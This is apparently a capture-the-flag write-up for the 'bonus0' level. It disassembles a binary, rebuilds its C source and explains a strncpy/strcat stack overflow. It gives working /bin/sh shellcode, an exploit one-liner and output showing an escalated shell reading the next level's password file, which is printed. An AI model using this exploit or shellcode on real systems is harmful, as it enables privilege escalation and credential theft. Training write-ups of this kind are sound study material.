# bonus0 - Buffer Overflow

On `bonus0`'s HOME, we find a binary named : `bonus0`

```shell
...
0x080484b4  p
0x0804851e  pp
0x080485a4  main
...
```

let's disassemble these functions:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40
   0x080485ad <+9>:	lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.
(gdb)  disass pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   0x08048521 <+3>:	push   edi
   0x08048522 <+4>:	push   ebx
   0x08048523 <+5>:	sub    esp,0x50
   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:	lea    eax,[ebp-0x30]
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    eax,[ebp-0x30]
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:	mov    WORD PTR [eax],dx
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   0x080485a0 <+130>:	pop    ebx
   0x080485a1 <+131>:	pop    edi
   0x080485a2 <+132>:	pop    ebp
   0x080485a3 <+133>:	ret    
End of assembler dump.
(gdb)  disass p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018
   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```shell
>$ cat source
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>


void	p( char *str, char *inter ) {

	char	buffer4[4104]; // ebp-0x1008 => 0xbfffe670
	char	*tmp;

	puts(" - ");
	read(0, buffer4, 4096);
	tmp = strchr(buffer4, '\n');
	*tmp = '\0';
	strncpy(str, buffer4, 20);

}


void	pp( char *str ) {

	char	buffer2[20];
	char	buffer3[28];

	p(buffer2, " - ");
	p(buffer3, " - ");
	strcpy(str, buffer2);
	str[strlen(str)] = ' ';
	str[strlen(str) + 1] = '\0';
	strcat(str, buffer3);

}


int main( void ) {

	char	buffer1[42]; // esp+0x16 => 0xbffff626

	pp(buffer1);
	return (0);

}
```

<br>

After some debugging using gdb and from the source code, we find two vulnerabilities
to exploit:

1. Since there are two consecutive calls to the `p()` function in the `pp()`
function, the buffer allocated on the stack will be in the same place. In fact,
on the second call to the `p()` function, all the characters not rewritten by
the call to the `read()` function will still be present in the buffer. We can
therefore place our shellcode there and then redirect eip to the location of
this shellcode.

2. At first glance, there doesn't seem to be any potential buffer overflow in
this code. But, in the `pp()` function, if we write **20 characters** in the
first buffer (`buffer2`), we can remove the terminal **NULL** byte from the
first input string (thanks to `strncpy()`, which doesn't certify the writing
of a **NULL** byte at the end of the copy if the source length is greater than
the size taken as an argument) and concatenate it with `buffer3` on the first
call to the `strcpy()` function. Then, when the `strcat()` function is called,
`buffer3` will be concatenated a second time on the previous "extended" buffer,
all written to the `buffer1` of the `main()` function, which is passed as an
argument to the `pp()` function. In all, we can write 60 characters in `buffer1`,
which is enough to rewrite the value of eip and thus use the logic of the first point.

<br>

For the first point, let's find beginning of the buffer `buffer4` :

```shell
(gdb) b *0x080484d6
Breakpoint 1 at 0x80484d6
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484d6 in p ()
(gdb) x/x $eax
0xbfffe670:	0x00000000
```

<br>

Second, let's check distance between start of buffer `buffer4` and eip and
the good format to rewrite eip:

```shell
(gdb) b *0x080485b1
Breakpoint 1 at 0x80485b1
(gdb) r
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080485b1 in main ()
(gdb) x/x $eax
0xbffff6f6:	0x98d80000
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x80485b1 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

# ... after some testing to find the good offset
(gdb) b *0x080485b9
Breakpoint 2 at 0x80485b9
(gdb) r < <(python -c 'print "A" * 20'; python -c 'print "A" * 9 + "B" * 4 + "C" * 7')
Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A" * 20'; python -c 'print "A" * 9 + "B" * 4 + "C" * 7')
 -
 -

Breakpoint 2, 0x080485b9 in main ()
(gdb) x/4x $ebp
0xbffff728:	0x41414141	0x42424242	0x43434343	0xf4434343

```

<br>

So our payloads will be:

**First:**

- NOP instructions: `0x90` * 150 *(large enough not to be rewritten by the second call to function `strcpy()`.)* 
- Our shellcode (check [level2](https://github.com/A-Mahla/Security-Pentest-Part-III/tree/main/level2) for explaination) -> `\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80`

**Second:** *(with format found previonsly)*

- NOP instructions: `0x90` * 9
- buffer4+0x50 : `\xbf\xff\xe6\xc0`
- NOP instructions: `0x90` * 7





<br>

We can now exploit this BOF :

```shell
(python -c 'print "\x90" * 150 + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"'; python -c 'print "\x90" * 9 + "\xbf\xff\xe6\xc0"[::-1] + "\x90" * 7'; cat ) | ./bonus0
```

```shell
(python -c 'print "\x90" * 150 + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"'; python -c 'print "\x90" * 9 + "\xbf\xff\xe6\xc0"[::-1] + "\x90" * 7"'; cat ) | ./bonus0
 -
 -
1�1�1Ұ
      R�//shS�/binS��̀����&������������� S��̀����&�������������
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
